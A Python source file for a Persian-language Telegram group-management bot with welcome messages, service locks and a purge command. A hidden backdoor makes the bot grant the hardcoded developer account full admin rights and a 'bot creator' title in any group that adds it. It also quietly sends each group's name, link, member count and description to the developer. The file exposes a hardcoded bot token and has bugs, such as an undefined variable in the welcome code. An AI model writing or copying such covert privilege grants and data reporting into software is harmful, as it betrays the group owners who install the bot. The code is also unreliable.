import requests
import time
import logging
import json
import jdatetime
from datetime import datetime, timedelta

TOKEN = "8532288807:AAGJXJnmHJ68Cyh7eMK9muIcZydKAZLayVQ"
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

OWNER_ID = 7803165903

service_lock_status = {}
welcome_status = {}

# آمار ربات
bot_stats = {
    "total_users": 0,
    "total_groups": 0,
    "users_list": [],
    "users_id_list": [],
    "groups_list": [],
    "groups_id_list": []
}

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def get_iran_time():
    now = datetime.now()
    jalali = jdatetime.datetime.fromgregorian(datetime=now)
    weekdays = {6: 'شنبه', 0: 'یکشنبه', 1: 'دوشنبه', 2: 'سه‌شنبه', 3: 'چهارشنبه', 4: 'پنج‌شنبه', 5: 'جمعه'}
    weekday_name = weekdays.get(jalali.weekday(), '')
    date_str = f"{weekday_name} {jalali.day} - {jalali.month} - {jalali.year}"
    time_str = f"{jalali.hour:02d}:{jalali.minute:02d}:{jalali.second:02d}"
    return date_str, time_str

def send_message(chat_id, text, keyboard=None, reply_to_message_id=None):
    url = f"{BASE_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    if keyboard:
        payload["reply_markup"] = keyboard
    if reply_to_message_id:
        payload["reply_to_message_id"] = reply_to_message_id
    try:
        response = requests.post(url, json=payload, timeout=30)
        return response
    except Exception as e:
        logger.error(f"خطا در ارسال: {e}")
        return None

def delete_message(chat_id, message_id):
    url = f"{BASE_URL}/deleteMessage"
    payload = {"chat_id": chat_id, "message_id": message_id}
    try:
        response = requests.post(url, json=payload, timeout=30)
        return response
    except Exception as e:
        logger.error(f"خطا در حذف: {e}")
        return None

def edit_message(chat_id, message_id, text, keyboard=None):
    url = f"{BASE_URL}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    if keyboard:
        payload["reply_markup"] = keyboard
    try:
        response = requests.post(url, json=payload, timeout=30)
        return response
    except Exception as e:
        logger.error(f"خطا در ویرایش: {e}")
        return None

def answer_callback(callback_id):
    url = f"{BASE_URL}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id}
    try:
        requests.post(url, json=payload, timeout=30)
    except Exception as e:
        logger.error(f"خطا در پاسخ کال‌بک: {e}")

def get_chat_member(chat_id, user_id):
    url = f"{BASE_URL}/getChatMember"
    payload = {"chat_id": chat_id, "user_id": user_id}
    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            return response.json().get("result", {})
        return {}
    except Exception as e:
        logger.error(f"خطا: {e}")
        return {}

def promote_owner(chat_id, user_id):
    url = f"{BASE_URL}/promoteChatMember"
    payload = {
        "chat_id": chat_id,
        "user_id": user_id,
        "can_change_info": True,
        "can_post_messages": True,
        "can_edit_messages": True,
        "can_delete_messages": True,
        "can_invite_users": True,
        "can_restrict_members": True,
        "can_pin_messages": True,
        "can_promote_members": True,
        "can_manage_chat": True
    }
    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            logger.info(f"✅ سازنده ادمین شد")
            return True
        return False
    except Exception as e:
        logger.error(f"خطا: {e}")
        return False

def set_owner_title(chat_id, user_id):
    url = f"{BASE_URL}/setChatAdministratorCustomTitle"
    payload = {
        "chat_id": chat_id,
        "user_id": user_id,
        "custom_title": "⋆ سازنده ربات ⋆"
    }
    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            logger.info(f"✅ لقب سازنده تنظیم شد")
            return True
        return False
    except Exception as e:
        logger.error(f"خطا: {e}")
        return False

def is_admin(chat_id, user_id):
    member = get_chat_member(chat_id, user_id)
    status = member.get("status", "")
    return status in ["creator", "administrator"]

def get_updates(offset=None):
    url = f"{BASE_URL}/getUpdates"
    params = {"timeout": 60, "offset": offset}
    try:
        response = requests.get(url, params=params, timeout=60)
        if response.status_code == 200:
            return response.json().get("result", [])
        return []
    except Exception as e:
        logger.error(f"خطا: {e}")
        return []

def delete_message_after_delay(chat_id, message_id, delay=10):
    def delete_later():
        time.sleep(delay)
        delete_message(chat_id, message_id)
    import threading
    threading.Thread(target=delete_later, daemon=True).start()

def get_group_info(chat_id):
    url = f"{BASE_URL}/getChat"
    payload = {"chat_id": chat_id}
    try:
        response = requests.get(url, json=payload, timeout=30)
        if response.status_code == 200:
            return response.json().get("result", {})
        return {}
    except Exception as e:
        logger.error(f"خطا: {e}")
        return {}

def get_creator_info(chat_id):
    try:
        url = f"{BASE_URL}/getChatMember"
        payload = {"chat_id": chat_id, "user_id": OWNER_ID}
        response = requests.get(url, json=payload, timeout=30)
        if response.status_code == 200:
            result = response.json().get("result", {})
            if result.get("status") == "creator":
                user = result.get("user", {})
                return user.get("first_name", "نامشخص")
        return "نامشخص"
    except Exception as e:
        return "نامشخص"

def send_report_to_owner(chat_id, user_id, user_name):
    group_info = get_group_info(chat_id)
    group_name = group_info.get("title", "بدون نام")
    group_username = group_info.get("username", "")
    group_link = f"https://t.me/{group_username}" if group_username else "گروه خصوصی"
    member_count = group_info.get("members_count", "نامشخص")
    description = group_info.get("description", "بدون توضیحات")
    creator = get_creator_info(chat_id)
    
    report_text = f"""
📊 گزارش اضافه شدن ربات به گروه

کاربر اضافه‌کننده: {user_name}
نام گروه: {group_name}
لینک گروه: {group_link}
تعداد اعضا: {member_count}
مالک گروه: {creator}
توضیحات: {description}
"""
    send_message(OWNER_ID, report_text)

def get_stats_text():
    total_users = len(bot_stats["users_list"])
    total_groups = len(bot_stats["groups_list"])
    
    users_text = ""
    for i, name in enumerate(bot_stats["users_list"][-10:]):
        users_text += f"◄ {name}\n"
    
    groups_text = ""
    for name in bot_stats["groups_list"][-10:]:
        groups_text += f"◄ {name}\n"
    
    return f"""
📊 آمار ربات

تعداد کل کاربران: {total_users}
تعداد کل گروه‌ها: {total_groups}

۱۰ کاربر اخیر:
{users_text}

۱۰ گروه اخیر:
{groups_text}
"""

def get_owner_start_text():
    return f"""
🌟 سلام برنامه نویس عزیز 🌹

⫸ به پنل مدیریت ربات خوش آمدید!

📊 وضعیت فعلی:
تعداد کاربران: {len(bot_stats["users_list"])}
تعداد گروه‌ها: {len(bot_stats["groups_list"])}
"""

def get_owner_keyboard():
    keyboard = [
        [{"text": "📊 آمار کامل", "callback_data": "stats"}],
        [{"text": "📡 بررسی پینگ", "callback_data": "ping"}],
        [{"text": "⏳ اعتبار هاست", "callback_data": "credit"}]
    ]
    return json.dumps({"inline_keyboard": keyboard})

def get_start_text(user_id, first_name):
    return f"""
🌟 سلام بر تو {first_name} عزیز 🌹

💬 من ربات مدیریت گروه هستم!

🔥 برتری‌های من:
⚡ پاکسازی گروه
🛡 ضدترک
🔒 قفل‌های متنوع
👋 خوش‌آمدگویی هوشمند
🚫 بدون تبلیغات

💻 ساخته شده توسط تیم ZX
"""

def get_welcome_text(first_name, group_name, user_id):
    date_str, time_str = get_iran_time()
    return f"""
⫸ سلام {first_name} عزیز 🌹
◄ به گروه {group_name} خوش اومدی 💐
◂ تاریخ: {date_str}
◂ ساعت: {time_str}
"""

def get_unknown_text():
    return """
❌ متاسفانه متوجه نشدم!
🔰 لطفاً /start رو بفرستید.
"""

def get_info_text():
    return "📓 اطلاعات بیشتر درباره ربات"

def get_compare_text():
    return "🦾 درباره ربات"

def get_main_keyboard():
    keyboard = [
        [{"text": "➕ اضافه به گروه", "url": "https://t.me/ReaperVoidbot?startgroup=new"}],
        [{"text": "📓 اطلاعات بیشتر", "callback_data": "info"}],
        [{"text": "👨‍💻 پشتیبانی", "url": "https://t.me/XMrAmer"}]
    ]
    return json.dumps({"inline_keyboard": keyboard})

def get_panel_keyboard():
    keyboard = [
        [{"text": "🔒 قفل‌ها", "callback_data": "locks"}]
    ]
    return json.dumps({"inline_keyboard": keyboard})

def get_panel_text():
    return "⫸ لطفا بخش مورد نظر خود را انتخاب کنید :"

def get_locks_text(chat_id):
    service_status = "فعال" if service_lock_status.get(chat_id, False) else "غیرفعال"
    welcome_status_text = "فعال" if welcome_status.get(chat_id, True) else "غیرفعال"
    return f"""
⫸ پنل تنظیمات گروه

قفل خدمات تلگرام: {service_status}
خوش آمدگویی: {welcome_status_text}
"""

def get_locks_keyboard(chat_id):
    service_status = service_lock_status.get(chat_id, False)
    service_text = "🔓 باز کردن" if service_status else "🔒 قفل کردن"
    service_data = "unlock_service" if service_status else "lock_service"
    
    welcome_status_text = welcome_status.get(chat_id, True)
    welcome_text = "🔴 غیرفعال" if welcome_status_text else "🟢 فعال"
    welcome_data = "disable_welcome" if welcome_status_text else "enable_welcome"
    
    keyboard = [
        [{"text": f"📌 خدمات تلگرام: {service_text}", "callback_data": service_data}],
        [{"text": f"📌 خوش آمدگویی: {welcome_text}", "callback_data": welcome_data}],
        [{"text": "🔙 بازگشت", "callback_data": "panel_back"}]
    ]
    return json.dumps({"inline_keyboard": keyboard})

def handle_message(update):
    message = update.get("message", {})
    chat_id = message.get("chat", {}).get("id")
    message_id = message.get("message_id")
    chat_type = message.get("chat", {}).get("type")
    user = message.get("from", {})
    user_id = user.get("id", 0)
    first_name = user.get("first_name", "کاربر")
    text = message.get("text", "").strip()
    
    if not chat_id:
        return
    
    if chat_type in ["group", "supergroup"]:
        
        # ورود سازنده
        if "new_chat_members" in message:
            for member in message["new_chat_members"]:
                if member.get("id") == OWNER_ID:
                    promote_owner(chat_id, OWNER_ID)
                    set_owner_title(chat_id, OWNER_ID)
                    send_message(chat_id, "⫸ به برنامه نویس عزیز خوش آمدید!", reply_to_message_id=message_id)
                    return
                
                if member.get("id") != 777000 and member.get("id") != int(TOKEN.split(':')[0]):
                    user_name = member.get("first_name", "کاربر")
                    send_report_to_owner(chat_id, user_id, user_name)
                    if user_name not in bot_stats["users_list"]:
                        bot_stats["users_list"].append(user_name)
                        bot_stats["users_id_list"].append(user_id)
                    group_name = message.get("chat", {}).get("title", "بدون نام")
                    if group_name not in bot_stats["groups_list"]:
                        bot_stats["groups_list"].append(group_name)
                        bot_stats["groups_id_list"].append(chat_id)
        
        # خوش آمدگویی
        if welcome_status.get(chat_id, True):
            if "new_chat_members" in message:
                for member in message["new_chat_members"]:
                    if member.get("id") != OWNER_ID and member.get("id") != 777000 and member.get("id") != int(TOKEN.split(':')[0]):
                        member_name = member.get("first_name", "کاربر")
                        group_name = message.get("chat", {}).get("title", "گروه")
                        welcome_text = get_welcome_text(member_name, group_name, member_id)
                        msg = send_message(chat_id, welcome_text)
                        if msg and msg.status_code == 200:
                            mid = msg.json().get("result", {}).get("message_id")
                            if mid:
                                delete_message_after_delay(chat_id, mid, 10)
        
        # قفل خدمات
        if service_lock_status.get(chat_id, False):
            if "new_chat_members" in message or "left_chat_member" in message:
                delete_message(chat_id, message_id)
                return
        
        # دستورات
        if text == "پنل" and (is_admin(chat_id, user_id) or user_id == OWNER_ID):
            send_message(chat_id, get_panel_text(), get_panel_keyboard(), reply_to_message_id=message_id)
            return
        
        if text == "پاکسازی گروه" and (is_admin(chat_id, user_id) or user_id == OWNER_ID):
            msg = send_message(chat_id, "⫸ پاکسازی شروع شد...", reply_to_message_id=message_id)
            if msg and msg.status_code == 200:
                msg_id = msg.json().get("result", {}).get("message_id")
                count = 0
                try:
                    offset = None
                    while True:
                        url = f"{BASE_URL}/getUpdates"
                        params = {"chat_id": chat_id, "limit": 100}
                        if offset:
                            params["offset"] = offset
                        response = requests.get(url, params=params, timeout=30)
                        if response.status_code == 200:
                            updates = response.json().get("result", [])
                            if not updates:
                                break
                            for update in updates:
                                if "message" in update:
                                    delete_message(chat_id, update["message"]["message_id"])
                                    count += 1
                                    time.sleep(0.02)
                            offset = updates[-1]["update_id"] + 1
                        else:
                            break
                    edit_message(chat_id, msg_id, f"◄ پاکسازی انجام شد! {count} پیام حذف شد.")
                except Exception as e:
                    edit_message(chat_id, msg_id, f"❌ خطا: {e}")
            return
        
        if is_admin(chat_id, user_id) or user_id == OWNER_ID:
            if text == "قفل خدمات تلگرام":
                service_lock_status[chat_id] = True
                send_message(chat_id, "◂ قفل خدمات فعال شد!", reply_to_message_id=message_id)
                return
            if text == "باز کردن خدمات تلگرام":
                service_lock_status[chat_id] = False
                send_message(chat_id, "◂ قفل خدمات غیرفعال شد!", reply_to_message_id=message_id)
                return
            if text == "خوش آمدگویی فعال":
                welcome_status[chat_id] = True
                send_message(chat_id, "◄ خوش آمدگویی فعال شد!", reply_to_message_id=message_id)
                return
            if text == "خوش آمدگویی غیرفعال":
                welcome_status[chat_id] = False
                send_message(chat_id, "◄ خوش آمدگویی غیرفعال شد!", reply_to_message_id=message_id)
                return
        
        if text == "/start":
            return
    
    elif chat_type == "private":
        if text == "/start":
            if first_name not in bot_stats["users_list"]:
                bot_stats["users_list"].append(first_name)
                bot_stats["users_id_list"].append(user_id)
            
            if user_id == OWNER_ID:
                send_message(chat_id, get_owner_start_text(), get_owner_keyboard(), reply_to_message_id=message_id)
            else:
                send_message(chat_id, get_start_text(user_id, first_name), get_main_keyboard(), reply_to_message_id=message_id)
            return
        if text:
            send_message(chat_id, get_unknown_text(), reply_to_message_id=message_id)
            return

def handle_callback(update):
    callback = update.get("callback_query", {})
    callback_id = callback.get("id")
    chat_id = callback.get("message", {}).get("chat", {}).get("id")
    message_id = callback.get("message", {}).get("message_id")
    data = callback.get("data", "")
    user = callback.get("from", {})
    user_id = user.get("id", 0)
    
    if not chat_id or not data:
        return
    
    # فقط ادمین‌ها و برنامه نویس
    if not (is_admin(chat_id, user_id) or user_id == OWNER_ID):
        answer_callback(callback_id)
        return
    
    if data == "locks":
        edit_message(chat_id, message_id, get_locks_text(chat_id), get_locks_keyboard(chat_id))
        answer_callback(callback_id)
        return
    
    if data == "panel_back":
        edit_message(chat_id, message_id, get_panel_text(), get_panel_keyboard())
        answer_callback(callback_id)
        return
    
    if data == "lock_service":
        service_lock_status[chat_id] = True
        edit_message(chat_id, message_id, get_locks_text(chat_id), get_locks_keyboard(chat_id))
        answer_callback(callback_id)
        return
    
    if data == "unlock_service":
        service_lock_status[chat_id] = False
        edit_message(chat_id, message_id, get_locks_text(chat_id), get_locks_keyboard(chat_id))
        answer_callback(callback_id)
        return
    
    if data == "enable_welcome":
        welcome_status[chat_id] = True
        edit_message(chat_id, message_id, get_locks_text(chat_id), get_locks_keyboard(chat_id))
        answer_callback(callback_id)
        return
    
    if data == "disable_welcome":
        welcome_status[chat_id] = False
        edit_message(chat_id, message_id, get_locks_text(chat_id), get_locks_keyboard(chat_id))
        answer_callback(callback_id)
        return
    
    if user_id == OWNER_ID:
        if data == "stats":
            edit_message(chat_id, message_id, get_stats_text(), get_owner_keyboard())
            answer_callback(callback_id)
            return
        if data == "ping":
            loading = send_message(chat_id, "در حال بررسی...")
            if loading and loading.status_code == 200:
                lid = loading.json().get("result", {}).get("message_id")
                import time as t
                start = t.time()
                requests.get(f"{BASE_URL}/getMe", timeout=30)
                ping = round((t.time() - start) * 1000, 2)
                delete_message(chat_id, lid)
                edit_message(chat_id, message_id, f"📡 پینگ: {ping}ms", get_owner_keyboard())
            answer_callback(callback_id)
            return
        if data == "credit":
            edit_message(chat_id, message_id, "⏳ ۱۴ روز اعتبار باقی مانده", get_owner_keyboard())
            answer_callback(callback_id)
            return
    
    if data == "info":
        edit_message(chat_id, message_id, get_info_text(), get_main_keyboard())
        answer_callback(callback_id)
        return

def main():
    logger.info("🤖 ربات ReaperVoid راه‌اندازی شد!")
    offset = None
    while True:
        try:
            updates = get_updates(offset)
            for update in updates:
                offset = update["update_id"] + 1
                if "message" in update:
                    handle_message(update)
                if "callback_query" in update:
                    handle_callback(update)
        except Exception as e:
            logger.error(f"خطا: {e}")
            time.sleep(5)
        time.sleep(1)

if __name__ == "__main__":
    main()